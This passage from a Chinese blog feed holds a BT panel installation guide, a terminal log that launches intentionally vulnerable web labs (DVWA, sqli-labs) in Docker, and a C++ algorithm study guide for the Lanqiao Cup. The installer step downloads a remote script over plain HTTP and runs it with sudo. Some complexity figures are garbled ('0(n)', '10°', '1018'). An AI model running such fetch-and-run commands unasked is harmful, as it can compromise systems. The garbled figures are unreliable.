安全组</strong>，选择你服务器所属的安全组。</li><li>在入方向规则中，添加允许 <code>8888</code> 端口的规则。</li></ul><h4 id="6-使用浏览器登录宝塔面板"><a href="#6-使用浏览器登录宝塔面板" class="headerlink" title="6. 使用浏览器登录宝塔面板"></a>6. <strong>使用浏览器登录宝塔面板</strong></h4><ul><li>打开浏览器（推荐使用 Chrome），在地址栏中输入步骤 4 中获取的 <strong>外网面板地址</strong>，回车。</li><li>输入系统生成的 <strong>username</strong> 和 <strong>password</strong>，然后点击 <strong>登录</strong>。</li></ul><h4 id="7-绑定宝塔账号"><a href="#7-绑定宝塔账号" class="headerlink" title="7. 绑定宝塔账号"></a>7. <strong>绑定宝塔账号</strong></h4><p>登录后，系统会提示你绑定宝塔账号。如果你还没有宝塔账号，你可以选择注册一个账号，然后进行绑定。</p><h4 id="8-使用宝塔面板"><a href="#8-使用宝塔面板" class="headerlink" title="8. 使用宝塔面板"></a>8. <strong>使用宝塔面板</strong></h4><p>绑定账号成功后，你就可以使用宝塔面板来管理服务器上的网站、数据库、FTP 等服务了。</p><hr><p>如果你遇到任何问题或有疑问，随时联系我，我可以为你提供更多帮助。</p><p>从报错信息来看，你正在使用的是 <strong>Ubuntu</strong> 或者与 Ubuntu 相似的发行版，而 <code>yum</code> 是 CentOS 或 RHEL 系统的包管理器，不适用于 Ubuntu。Ubuntu 系统使用的是 <code>apt</code> 包管理器。你可以按照适用于 <strong>Ubuntu</strong> 的安装命令来安装宝塔面板。</p><h3 id="Ubuntu-Deepin-安装宝塔面板的正确命令："><a href="#Ubuntu-Deepin-安装宝塔面板的正确命令：" class="headerlink" title="Ubuntu&#x2F;Deepin 安装宝塔面板的正确命令："></a><strong>Ubuntu&#x2F;Deepin 安装宝塔面板的正确命令</strong>：</h3><ol><li><p><strong>更新软件包和安装 wget</strong>：<br>先确保系统软件包是最新的，并安装 <code>wget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install -y wget<br></code></pre></td></tr></table></figure></li><li><p><strong>下载并运行宝塔面板安装脚本</strong>：<br>运行以下命令来下载并安装宝塔面板：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; <span class="hljs-built_in">sudo</span> bash install.sh<br></code></pre></td></tr></table></figure></li></ol><p>安装过程中的步骤和提示将与你之前看到的相似。安装完成后，你将看到外网面板地址、内网面板地址、默认用户名和密码。按照步骤开放端口并通过浏览器登录宝塔面板。</p><p>如果你继续遇到问题，可以随时告诉我。</p><p>helloctfos@Hello-CTF:<del>$ docker –version<br>Docker version 25.0.4, build 1a576c5<br>helloctfos@Hello-CTF:</del>$ docker ps<br>CONTAINER ID   IMAGE                           COMMAND                  CREATED          STATUS          PORTS                          NAMES<br>39ab35c854b7   c0ny1&#x2F;dvwa:v1.9                 “&#x2F;run.sh”                12 minutes ago   Up 12 minutes   3306&#x2F;tcp, 0.0.0.0:88-&gt;80&#x2F;tcp   dvwa-web-1<br>90fd3fcc087f   ghcr.io&#x2F;digininja&#x2F;dvwa:latest   “docker-php-entrypoi…”   3 months ago     Up 24 minutes   127.0.0.1:4280-&gt;80&#x2F;tcp         dvwa-master-dvwa-1<br>cc73bc682afe   mariadb:10                      “docker-entrypoint.s…”   3 months ago     Up 24 minutes   3306&#x2F;tcp                       dvwa-master-db-1<br>helloctfos@Hello-CTF:<del>$ cd vulstudy<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy$ cd<br>helloctfos@Hello-CTF:<del>$ cd vulstudy<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy$ ls<br>BodgeIt  Hackademic  README.md   Webug               bWAPP               mutillidae       www<br>DSVW     LKWA        WackoPicko  XSS-challenge-tour  doc                 sqli-labs        xvwa<br>DVWA     MCIR        WebGoat     XSSed               docker-compose.yml  vulnerable-node<br>helloctfos@Hello-CTF:<del>&#x2F;vulstudy$ cd sqli-labs&#x2F;<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy&#x2F;sqli-labs$ ls<br>Dockerfile  docker-compose.yml<br>helloctfos@Hello-CTF:<del>&#x2F;vulstudy&#x2F;sqli-labs$ vi docker-compose.yml<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy&#x2F;sqli-labs$ docker-compose up -d<br>u</p><p>cd vulstudy</p><p>ls</p><p>cd sqli-labs&#x2F;</p><p>ls</p><p>vi docker-compose.yml</p><p>docker-compose up -d</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>算法笔记</title>
    <link href="/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>注意:本笔记代码都是c++，而且为了蓝桥杯做了很大的改变，所以初次学不要按照本笔记</p><h1 id="c-代码的基础内容"><a href="#c-代码的基础内容" class="headerlink" title="c++代码的基础内容"></a>c++代码的基础内容</h1><h2 id="DevC-常用快捷键"><a href="#DevC-常用快捷键" class="headerlink" title="DevC++常用快捷键"></a>DevC++常用快捷键</h2><ol><li><p>F9<code>：编译并运行程序。</code></p></li><li><p>Shift + F9：仅编译（不运行）</p></li><li><p><code>Ctrl + /</code>：注释当前行或选中的代码</p></li><li><p><code>Ctrl + Shift + /</code>：取消注释</p></li><li><p>进入 <code>工具</code> -&gt; <code>编辑器选项</code> -&gt; <code>代码模板</code>，在其中添加你常用的代码片段。例如，可以创建一个 <code>for</code> 循环模板，快速插入到代码中。</p></li><li><p>打开 Dev C++，点击 <strong>工具</strong> -&gt; <strong>编译选项</strong>。</p><p>在 <strong>编译选项</strong> 窗口中，选择 <strong>编译器设置</strong>。</p><p>在 <strong>设置</strong> 选项卡下的 <strong>命令行</strong> 中，加入 <code>-std=c++11</code>（或更高版本的标准，如 <code>-std=c++14</code>、<code>-std=c++17</code>）。</p></li></ol><p>++++</p><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><ul><li><p><code>#include &lt;bits/stdc++.h&gt;</code><br>不需要一一手动包含，但是占时间，容易超时，不会再写。</p></li><li><p><code>#include &lt;iostream&gt;</code><br>标准输入输出流，常用对象：<code>std::cin</code>, <code>std::cout</code>, <code>std::cerr</code>, <code>std::endl</code>。</p></li><li><p><code>#include &lt;string&gt;</code><br>字符串操作，常用类：<code>std::string</code>，常用函数：<code>std::getline</code>。</p></li><li><p><code>#include &lt;cstring&gt;</code><br>C风格字符串操作，常用函数：<code>strlen</code>, <code>strcpy</code>, <code>strcmp</code>。</p></li><li><p><code>#include &lt;vector&gt;</code><br>动态数组容器，常用类：<code>std::vector</code>。</p></li><li><p><code>#include &lt;algorithm&gt;</code><br>通用算法，常用函数：<code>std::sort</code>, <code>std::find</code>, <code>std::max</code>, <code>std::min</code>。</p></li><li><p><code>#include &lt;map&gt;</code><br>有序键值对容器，常用类：<code>std::map</code>。</p></li><li><p><code>#include &lt;unordered_map&gt;</code><br>无序键值对容器，常用类：<code>std::unordered_map</code>。</p></li><li><p><code>#include &lt;unordered_set&gt;</code><br>提供哈希集合，常用类：<code>std::unordered_set</code></p></li><li><p><code>#include &lt;cmath&gt;</code><br>数学函数，常用函数：<code>std::sqrt</code>, <code>std::pow</code>, <code>std::sin</code>, <code>std::cos</code>。</p></li><li><p><code>#include &lt;numeric&gt;</code><br>数值操作，常用函数：<code>std::accumulate</code>, <code>std::gcd</code>。</p></li><li><p><code>#include &lt;utility&gt;</code><br>工具函数，常用类：<code>std::pair</code>。</p></li></ul><h2 id="日期填空题巧用电脑自带Office软件"><a href="#日期填空题巧用电脑自带Office软件" class="headerlink" title="日期填空题巧用电脑自带Office软件"></a>日期填空题巧用电脑自带Office软件</h2><h4 id="求日期差（excel）"><a href="#求日期差（excel）" class="headerlink" title="求日期差（excel）"></a>求日期差（excel）</h4><p>格中输入： </p><hr><h1 id="蓝桥杯备考"><a href="#蓝桥杯备考" class="headerlink" title="蓝桥杯备考"></a>蓝桥杯备考</h1><p>C++代码中的操作次数控制在 10的7为最佳。64MB相当于10的7个int</p><h2 id="N的范围判断算法是什么"><a href="#N的范围判断算法是什么" class="headerlink" title="N的范围判断算法是什么"></a>N的范围判断算法是什么</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>n &lt; <span class="hljs-number">30</span>,指数级别, dfs+剪枝，状态压缩dp<br><span class="hljs-number">2.</span>n &lt; <span class="hljs-number">100</span>=&gt;<span class="hljs-number">0</span>(n)，foyd, dp<br><span class="hljs-number">3.</span>n&lt;<span class="hljs-number">1000</span>=&gt;<span class="hljs-number">0</span>(n2)，<span class="hljs-number">0</span>(n?logn)，dp，二分<br><span class="hljs-number">4.</span>n ≤ <span class="hljs-number">10000</span> =&gt;<span class="hljs-number">0</span>(n* √n)，块状链表<br><span class="hljs-number">5.</span>&lt; <span class="hljs-number">100000</span>=&gt;<span class="hljs-number">0</span>(nlogn)=&gt;各种sort，线段树、树状数组、<span class="hljs-built_in">set</span>/<span class="hljs-built_in">map</span>、heap、dijkstratheap、spfa、求凸包、求半<br>平面交、二分<br><span class="hljs-number">6.</span>n&lt; <span class="hljs-number">1000000</span> =&gt; <span class="hljs-number">0</span>(m),以及常数较小的 <span class="hljs-number">0</span>(nlogn)算法=&gt;hash、双指针扫描、kmp、AC自动机，常数比较小的O(nlogn)的做法:sort、树状数组、heap、dijkstra、spfa<br><span class="hljs-number">7.</span>n &lt; <span class="hljs-number">10000000</span> =&gt;<span class="hljs-number">0</span>(n)，双指针扫描、kmp、AC自动机、线性筛素数<br><span class="hljs-number">8.</span>n ≤ <span class="hljs-number">10</span>° =&gt;O(√π)，判断质数<br><span class="hljs-number">9.</span>n&lt; <span class="hljs-number">1018</span> =&gt;<span class="hljs-number">0</span>(logn)，最大公约数<br></code></pre></td></tr></table></figure><h2 id="最基础的部分："><a href="#最基础的部分：" class="headerlink" title="最基础的部分："></a>最基础的部分：</h2><p>顺序，选择，循环，数组，函数，字符串，结构体(类)的语法(必会)，高精度 ，组合数的思想，概率论与期望常见公式，找规律能力，进制转换</p><h2 id="基础算法"><a href="#基础算法" class="headerlink" title="基础算法"></a>基础算法</h2><p>一维前缀和差分与二维前缀和差分(必会，思想很简单)</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>链表，队列，栈(模拟)，优先列队&#x2F;堆，哈希表，单调栈，单调队列，二维单调队列(求解子矩阵最值，尽量会)，并查集，树状数组(解决单点修改，区间求和问题，尽量会，一般考就压轴)，线段树</p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>dfs(回溯),bfs(必会，比较简单，解决等权值最小路径问题),二进制枚举(必会，近三年填空题考的多，用二进制位01表示选和不选)</p><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>记忆化搜索(尽可能会，因为基本上所有dp题都可以用记搜)</p><p>线性dp(必会，考的非常多与频繁，前几年基本上一场会出现至少二题线性dp，去年没考)</p><p>背包问题与背包计数(必会，01，完全，多重，还有个整数划分问题)</p><p>区间dp,树形dp,数位dp,状压dp</p><h2 id="数论"><a href="#数论" class="headerlink" title="数论"></a>数论</h2><p>最大公约数，最小公倍数，唯一分解定理(必会)<br>素数，素数筛法 (必会)<br>快速幂，费马小定理求逆元(必会)<br>排列组合，第二类斯特林数(必会)<br>概率论与期望公式(尽量会，去年第一次考，然后每年都会考均值期望)<br>矩阵乘法(尽量会，近几年没考过)<br>数论分块(尽量会，近几年没考过)</p><h2 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h2><p>单起点多终点正权最短路(必会，dijikstra)<br>单起点多终点负权最短路(必会，Bellmanford，spfa)<br>多起点多终点最短路(必会，Floy 记住循环kij就好）<br>最小瓶颈路<br>最小生成树<br>最近公共祖光(Ica)尽量会)</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>字符串哈希(必会，尤其是与二分结合的思想以及回文半径回文中心的思想)<br>kmp(必会，会求周期)<br>manacher(求回文串，尽可能会)<br>字典树(尽可能会)</p><hr><h1 id="C-算法详细内容"><a href="#C-算法详细内容" class="headerlink" title="C++算法详细内容"></a>C++算法详细内容</h1><h2 id="基础数据结构和算法"><a href="#基础数据结构和算法" class="headerlink" title="基础数据结构和算法"></a><strong>基础数据结构和算法</strong></h2><h3 id="1-基础语法与数据类型"><a href="#1-基础语法与数据类型" class="headerlink" title="1. 基础语法与数据类型"></a>1. <strong>基础语法与数据类型</strong></h3><h4 id="1-输入输出"><a href="#1-输入输出" class="headerlink" title="1.输入输出"></a>1.输入输出</h4><p>cin和cout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">cin</span> &gt;&gt; a;  <span class="hljs-comment">// 从键盘输入一个整数</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出结果</span><br><br><span class="hljs-type">char</span> ch;<br><span class="hljs-built_in">cin</span> &gt;&gt; ch;  <span class="hljs-comment">// 输入一个字符</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Character: &quot;</span> &lt;&lt; ch &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出字符</span><br><br><br><span class="hljs-built_in">string</span> str;<br><span class="hljs-built_in">cin</span> &gt;&gt; str;  <span class="hljs-comment">// 只会读取一个单词，遇到空格会停止</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>, str);  <span class="hljs-comment">// 读取一整行，包括空格，用之前确认是否有空字符，用getchar处理</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br></code></pre></td></tr></table></figure><p>scanf和printf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%f%lf%s%c&quot;</span>, &amp;a, &amp;b, &amp;c, str,ch);<span class="hljs-comment">// Double: %lf， 默认保留6位小数,Char: %c, 回车也是一个字符，用’\n’表示 ,%s读取一个字符串（遇到空格会停止）</span><br><br><span class="hljs-type">int</span> arr[<span class="hljs-number">100000</span>];  <span class="hljs-comment">// 假设最大输入量是100000</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i)  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;arr[i]);<br>  <br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);  <span class="hljs-comment">// 读取一个字符串（直到遇到空格）</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你输入的字符串是: %s\n&quot;</span>, str);<br><br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]&quot;</span>, str);  <span class="hljs-comment">// 读取一整行，直到换行符,包含空格的字符串</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);  <span class="hljs-comment">// 读取整数</span><br>    getchar();         <span class="hljs-comment">// 清除输入缓冲区中的换行符,每读取一行就getchar()</span><br>    <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]&quot;</span>, str);  <span class="hljs-comment">// 读取一行字符串</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你输入的字符串是: %s\n&quot;</span>, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入的整数是: %d\n&quot;</span>, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入的浮点数是: %.2f\n&quot;</span>, b);  <span class="hljs-comment">// 控制浮点数输出保留两位小数</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入的双精度浮点数是: %.3lf\n&quot;</span>, c);  <span class="hljs-comment">// 控制双精度浮点数输出保留三位小数</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入的字符串是: %s\n&quot;</span>, str);<span class="hljs-comment">//直到&#x27;\0&#x27;才结束也就是可以带空格</span><br><br><span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(arr) / <span class="hljs-keyword">sizeof</span>(arr[<span class="hljs-number">0</span>]); ++i) &#123;   <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, arr[i]);<br>&#125;<br><br><span class="hljs-comment">// 使用 scanf 输入 vector 中的每个元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;vec[i]);  <span class="hljs-comment">// 逐个读取元素</span><br>&#125;<br><span class="hljs-comment">// 输出读取到的元素</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vector elements: &quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec.size(); ++i) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vec[i]);  <span class="hljs-comment">// 输出每个元素</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果带空格,用cin&#x2F;scanf之后不能<strong>盲目用</strong>getchar&#x2F;getline&#x2F;get，如果要用，<strong>就要在cin后吃字符</strong></p><p>用getchar&#x2F;getline&#x2F;get之后可以用cin&#x2F;scanf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//getline/getchar/get可以接受空格，读取时遇到换行符结束</span><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>, str);<br><span class="hljs-built_in">cout</span>&lt;&lt;str&lt;&lt;<span class="hljs-built_in">endl</span>;    <br></code></pre></td></tr></table></figure><p>可能输入的场景总结</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*输入多个整数 </span><br><span class="hljs-comment">4</span><br><span class="hljs-comment">5 3 8 1</span><br><span class="hljs-comment">*/</span>      <br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);  <span class="hljs-comment">// 输入整数的个数</span><br><span class="hljs-type">int</span> arr[n];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;arr[i]);  <span class="hljs-comment">// 输入每个整数</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*输入一个二维数组（矩阵）</span><br><span class="hljs-comment">1 2 3</span><br><span class="hljs-comment">4 5 6</span><br><span class="hljs-comment">7 8 9</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// 输入行数和列数</span><br><span class="hljs-type">int</span> mat[n][m];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;mat[i][j]);  <span class="hljs-comment">// 输入矩阵的每个元素</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// 输入矩阵元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; matrix[i][j];  <span class="hljs-comment">// 使用 cin 读取每个元素</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">// 输出矩阵元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; matrix[i][j] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出矩阵的元素</span><br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出完一行后换行</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*输入单行字符串（没有空格）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);  <span class="hljs-comment">// 输入不包含空格的单行字符串</span><br><br><br><span class="hljs-comment">/*入整行字符串（包括空格）</span><br><span class="hljs-comment">Hello world! Welcome to BlueBridge.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">string</span> line;<br><span class="hljs-comment">// 使用 getline 读取一整行输入，包括空格</span><br>getline(<span class="hljs-built_in">cin</span>, line);<br><span class="hljs-comment">// 输出输入的字符串</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; line &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><br><br><span class="hljs-comment">/* 输入多行字符串</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">Hello</span><br><span class="hljs-comment">world</span><br><span class="hljs-comment">BlueBridge</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*输入多个空格分隔的字符串，逐个处理</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">apple banana cherry</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">cin</span> &gt;&gt; n;  <span class="hljs-comment">// 读取输入的行数</span><br><span class="hljs-built_in">cin</span>.ignore();  <span class="hljs-comment">// 忽略掉输入行数后的换行符</span><br><span class="hljs-built_in">string</span> line;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    getline(<span class="hljs-built_in">cin</span>, line);  <span class="hljs-comment">// 逐行读取字符串</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; line &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出每行</span><br>&#125;<br><br><br><br><span class="hljs-comment">/*输入一个二维字符数组</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> mat[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// 输入行数和列数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; 